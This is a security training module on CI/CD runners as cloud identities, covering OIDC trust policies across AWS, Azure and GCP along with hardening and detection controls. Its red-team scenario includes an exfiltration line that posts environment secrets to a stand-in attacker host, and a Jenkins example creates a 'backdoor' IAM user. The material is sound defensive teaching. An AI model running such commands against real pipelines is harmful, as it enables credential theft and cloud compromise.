# 06 — CI/CD Runner as Cloud Principal

> **Level:** Advanced
> **Prereqs:** [02-04 — Long-Lived Keys vs Workload Identity](../IAM/long-lived-keys-vs-workload-identity.md), [08-03 — Plan Poisoning & Plan Cache](./plan-poisoning-and-plan-cache.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Execution, Persistence, Credential Access, Privilege Escalation
> **Authorization scope:** Run only against your own CI/CD pipelines and cloud sandbox accounts; all role names and repos are placeholders.

## What & why

A CI/CD runner that can apply Terraform to production is a cloud identity with god-mode privileges. If an attacker compromises the repo, the runner, or the runner's credentials, they inherit every permission the deploy role has — typically `*:*` on production. Treating the CI runner as a cloud principal means applying all IAM hygiene: least privilege, short-lived credentials, scoped trust, and audit logging.

## The OnPrem reality

Jenkins masters ran on EC2 instances with instance profiles carrying `AdministratorAccess`. Any job could `aws s3 ls`, `aws ec2 describe-*`, and `aws iam create-user` — the Jenkinsfile was the authorization boundary. Credentials lived in Jenkins credential store (encrypted on disk, but decrypted at runtime for any job that referenced them) and leaked through build console output.

```groovy
// Classic Jenkins anti-pattern — full admin for every job
pipeline {
    agent { label 'terraform' }
    // EC2 instance profile has AdministratorAccess
    // Any branch, any PR, any contributor can:
    steps {
        sh 'aws iam create-user --user-name backdoor'  // instant lateral move
    }
}
```

## Core concepts

| Concept | Description | Risk |
|---|---|---|
| OIDC federation | Runner exchanges IdP token for cloud credentials | Misconfigured `sub` claim = any repo in org gets creds |
| Workload Identity (GCP) / Managed Identity (Azure) | Identity attached to runner environment | Environment-wide scope if not scoped to repo/branch |
| Ephemeral runner | Runner destroyed after each job | Reduces persistence window but not initial compromise |
| `pull_request_target` (GitHub) | Workflow runs with base-repo privileges on PR code | Attacker's PR code runs as production deployer |
| Environment protection rules | Require approval, restrict branches | Bypassed if environment not enforced |

## Cross-cloud federation trust policies

### AWS — GitHub Actions OIDC

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::111111111111:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:example-org/example-repo:environment:production"
        }
      }
    }
  ]
}
```

**Subject claim filtering options:**

| Subject pattern | Scope | Risk |
|---|---|---|
| `repo:example-org/*:*` | All repos, all envs | Any repo in org can assume the role |
| `repo:example-org/example-repo:*` | All branches/environments in one repo | PR from fork can still trigger (if `pull_request_target`) |
| `repo:example-org/example-repo:ref:refs/heads/main` | Only main branch | Prevents PR-triggered assume |
| `repo:example-org/example-repo:environment:production` | Only production environment | Environment protection rules add review gate |
| `repo:example-org/example-repo:pull_request` | Only PR events | Used for plan-only (read) roles |

### Azure — GitHub Actions OIDC

```bash
# Create federated credential on existing Service Principal
az ad app federated-credential create \
  --id "00000000-0000-0000-0000-000000000000" \
  --federated-credential-file github-prod-cred.json
```

```json
{
  "name": "github-prod-oidc",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:example-org/example-repo:environment:production",
  "audiences": ["api://AzureADTokenExchange"]
}
```

```bash
# Verify: list federated credentials on the app
az ad app federated-credential list --id "00000000-0000-0000-0000-000000000000" \
  --query "[].{name:name, subject:subject}"
```

### GCP — Workload Identity Federation

```bash
# Create workload identity pool
gcloud iam workload-identity-pools create "github-pool" \
  --location="global" \
  --display-name="GitHub Actions Pool"

# Add GitHub as identity provider
gcloud iam workload-identity-pools providers create-oidc "github-provider" \
  --location="global" \
  --workload-identity-pool="github-pool" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository,attribute.ref=assertion.ref" \
  --attribute-condition="attribute.repository == 'example-org/example-repo'"

# Grant service account impersonation — scoped to specific repo
gcloud iam service-accounts add-iam-policy-binding \
  "terraform-deploy@project-id.iam.gserviceaccount.com" \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/000000000000/locations/global/workloadIdentityPools/github-pool/attribute.repository/example-org/example-repo"
```

### OnPrem — Jenkins + Vault

```hcl
# Vault policy for Jenkins — grant only the exact secret path needed
path "aws/sts/deploy-role" {
  capabilities = ["read"]
}

# Jenkins Pipeline — Vault token is short-lived
pipeline {
    agent { label 'terraform' }
    environment {
        VAULT_TOKEN = credentials('vault-jenkins-token')
    }
    stages {
        stage('Get AWS Creds') {
            steps {
                script {
                    def creds = sh(script: '''
                        vault read -format=json aws/sts/deploy-role | \
                        jq -r ".data | [.access_key, .secret_key, .security_token] | join(\" \")"
                    ''', returnStdout: true).trim().split(" ")
                    env.AWS_ACCESS_KEY_ID = creds[0]
                    env.AWS_SECRET_ACCESS_KEY = creds[1]
                    env.AWS_SESSION_TOKEN = creds[2]
                }
            }
        }
    }
}
```

## 🔴 Red Team view

**Narrative: `pull_request_target` + OIDC → full cloud compromise.**

The `pull_request_target` event in GitHub Actions runs workflow code from the *base* repository with full secrets/OIDC access, even when triggered by a fork PR. This is the most dangerous event trigger.

**Contained scenario:**

1. Attacker forks `example-org/infra-live` (public repo).
2. Finds `.github/workflows/deploy.yml` using `pull_request_target`:
   ```yaml
   on:
     pull_request_target:
       branches: [main]
   jobs:
     plan:
       permissions:
         id-token: write
       steps:
         - uses: actions/checkout@v4
           with:
             ref: ${{ github.event.pull_request.head.sha }}  # attacker's code!
   ```
3. Attacker adds to the PR:
   ```yaml
   - run: |
       aws sts get-caller-identity
       aws s3 ls  # dumps all buckets
       curl -X POST https://attacker.example.com/exfil -d "$(env)"
   ```
4. Opens PR. The workflow runs with the repository's OIDC role — giving the attacker the same cloud access as the deploy pipeline.
5. Attacker exfiltrates temporary credentials (valid for 1 hour) or, if the role has `iam:CreateAccessKey`, creates a long-lived backdoor key.

**Artifacts left:**
- GitHub audit log: `workflow_run` with `trigger: pull_request_target` from external fork
- CloudTrail: `sts:GetCallerIdentity` with unusual `sourceIPAddress` (attacker's exit node or Actions runner IP, but unusual sequence of calls)
- CloudTrail: If `iam:CreateAccessKey` was called, permanent credential creation by deploy role

**The fix (never do this):**
```yaml
# ⚠️ NEVER: pull_request_target + checkout PR code
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # RUNS UNTRUSTED CODE WITH PROD IDENTITY

# ✅ SAFE: pull_request (not _target) + read-only checkout
on: pull_request
permissions:
  contents: read
  id-token: none  # no cloud access at all for PRs
```

## 🔵 Blue Team view

**Preventive controls:**

1. **Workflow hardening matrix:**

   | Event | Permissions | Cloud access | Safe for PR? |
   |---|---|---|---|
   | `pull_request` | `contents: read` | None | Yes |
   | `pull_request_target` | `id-token: write` | Full cloud | **ONLY if no checkout of PR code with elevated perms** |
   | `push` (main) | `id-token: write` | Scoped to environment | Yes |
   | `workflow_dispatch` | `id-token: write` | Scoped to environment | Yes (manual trigger) |

2. **OIDC subject scoped to environment + branch:**
   ```hcl
   # Terraform for IAM role trust
   data "aws_iam_policy_document" "github_oidc" {
     statement {
       actions   = ["sts:AssumeRoleWithWebIdentity"]
       principals {
         type        = "Federated"
         identifiers = [aws_iam_openid_connect_provider.github.arn]
       }
       condition {
         test     = "StringEquals"
         variable = "token.actions.githubusercontent.com:aud"
         values   = ["sts.amazonaws.com"]
       }
       condition {
         test     = "StringLike"
         variable = "token.actions.githubusercontent.com:sub"
         values = [
           "repo:example-org/example-repo:environment:production"
         ]
       }
     }
   }
   ```

3. **Require environment protection rules (GitHub):**
   ```
   Settings → Environments → production
   - Required reviewers: @example-org/sre (minimum 2)
   - Wait timer: 5 minutes
   - Deployment branches: main only
   ```

4. **Separate IAM roles per pipeline stage:**

   | Stage | Role permissions | Max session duration |
   |---|---|---|
   | `terraform plan` | `ReadOnlyAccess` + `s3:GetObject` on state | 15 min |
   | `terraform apply` | Resource-specific write (e.g., `ec2:*`, `rds:*`) — never `iam:*` | 30 min |
   | `terraform destroy` | Same as apply + `s3:DeleteObject` on state | 30 min |

5. **Prevent `pull_request_target` misuse — CI gate:**
   ```bash
   #!/bin/bash
   # CI step: block workflows using pull_request_target with PR code checkout
   for wf in .github/workflows/*.yml; do
     if grep -q "pull_request_target" "$wf" && grep -q 'ref:.*pull_request.head' "$wf"; then
       echo "BLOCKED: $wf uses pull_request_target with untrusted PR code checkout"
       exit 1
     fi
   done
   ```

6. **Maximum session duration for CI roles:**
   ```hcl
   resource "aws_iam_role" "github_apply" {
     name               = "github-actions-apply"
     assume_role_policy = data.aws_iam_policy_document.github_oidc.json
     max_session_duration = 1800  # 30 min — apply shouldn't take longer
   }
   ```

**Detection signals:**

| Signal | AWS | Azure | GCP |
|---|---|---|---|
| AssumeRoleWithWebIdentity from unexpected repo | CloudTrail `sourceIdentity` contains unexpected repo name | Sign-in logs `token.issuer` mismatch | Audit log `authenticationInfo.principalSubject` |
| Cloud API calls from Actions IP but to unusual resources | `sourceIPAddress` in Actions CIDR + `ec2:DescribeInstances` from plan role | Same — `callerIpAddress` + unusual resource provider | Same — caller IP + unexpected `methodName` |
| `iam:CreateAccessKey` from deploy role | CloudTrail — this call should NEVER come from deploy role | `Microsoft.Authorization/roleAssignments/write` | `iam.serviceAccountKeys.create` |

## Hands-on lab

1. Set up a GitHub repo with OIDC to AWS (sandbox):
   ```bash
   mkdir lab-runner-principal && cd lab-runner-principal
   # This lab is a configuration exercise, not a runnable script.
   # You'll configure it in your own GitHub repo.
   ```

2. Create two IAM roles — one for plan, one for apply:
   ```bash
   # Plan role (read-only)
   aws iam create-role --role-name github-plan-readonly \
     --assume-role-policy-document file://trust-plan.json

   aws iam attach-role-policy \
     --role-name github-plan-readonly \
     --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess

   # Apply role (scoped write — example: EC2 only)
   aws iam create-role --role-name github-apply-ec2 \
     --assume-role-policy-document file://trust-apply.json

   aws iam put-role-policy \
     --role-name github-apply-ec2 \
     --policy-name EC2Write \
     --policy-document file://ec2-write-policy.json
   ```

3. Verify the trust policy scoping:
   ```bash
   # Ensure only your repo's production env can assume the apply role
   aws iam get-role --role-name github-apply-ec2 \
     --query "Role.AssumeRolePolicyDocument.Statement[0].Condition.StringLike"
   # Expected: "token.actions.githubusercontent.com:sub":
   #   "repo:YOUR-ORG/YOUR-REPO:environment:production"
   ```

4. Create a workflow `.github/workflows/deploy.yml` with plan/apply jobs using the separate roles.

5. **Teardown:** Delete the IAM roles (`aws iam delete-role --role-name github-plan-readonly` etc.)

## References

- [GitHub Actions — Security Hardening for Deployments](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments)
- [AWS — Configuring OIDC for GitHub Actions](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html)
- [Azure — Workload Identity Federation](https://learn.microsoft.com/en-us/azure/active-directory/develop/workload-identity-federation-create-trust)
- [GCP — Workload Identity Federation for GitHub](https://cloud.google.com/iam/docs/workload-identity-federation-with-other-providers)
- [GitHub Security: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- See ATT&CK: T1078 (Valid Accounts), T1525 (Implant Internal Image)
- [08-03 — Plan Poisoning & Plan Cache](./plan-poisoning-and-plan-cache.md)
